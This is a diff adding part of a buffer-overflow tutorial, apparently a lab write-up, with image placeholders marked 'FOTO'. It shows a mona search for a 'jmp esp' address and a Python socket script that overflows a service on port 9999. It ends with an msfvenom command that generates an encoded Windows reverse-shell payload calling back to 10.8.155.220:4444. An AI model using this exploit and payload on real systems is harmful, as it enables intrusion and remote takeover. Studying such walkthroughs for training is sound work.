@@ -194,3 +194,70 @@ Now we copy the output again, put it in the exploit removing the previous one, r
 
 FOTO
 
+FOTO
+
+FOTO
+
+FOTO
+
+FOTO
+
+FOTO
+
+Apparently only the 00 was a badchar, now, let's locate some memory space that does not change with each execution, that is, that does not have ASLR.
+
+FOTO
+
+FOTO
+
+FOTO
+
+FOTO
+
+Now we are going to use mona to see if we can locate any jmp esp of a .dll and then put the shellcode at the top of the stack and then we will have the return address that we have to put after the script characters to execute the shellcode once we have it.
+
+We go to log and execute:
+
+```shell
+mona.mona("jmp -r esp")
+```
+
+FOTO
+
+FOTO
+
+FOTO
+
+There is only one memory address that jumps to esp and it is quite useful, let's add it to the script.
+
+```python
+import socket
+import time
+import sys
+
+target = '127.0.0.1'
+port = 9999
+
+buffer = '\x41' * 524
+buffer += '\xf3\x12\x17\x31'
+
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((target, port))
+print(buffer)
+s.send((buffer))
+s.close()
+```
+
+FOTO
+
+Now we only need the shellcode itself, for this, we are going to use msfvenom with the following syntax:
+
+```shell
+msfvenom -p windows/shell_reverse_tcp LHOST=10.8.155.220 LPORT=4444 -e x86/shikata_ga_nai -f py -b "\x00"
+```
+
+FOTO
+
+Finally we would only have to modify the script adding that shellcode and changing the target by the real target and execute, but first we have to open the port that we have put in the msfvenom.
+
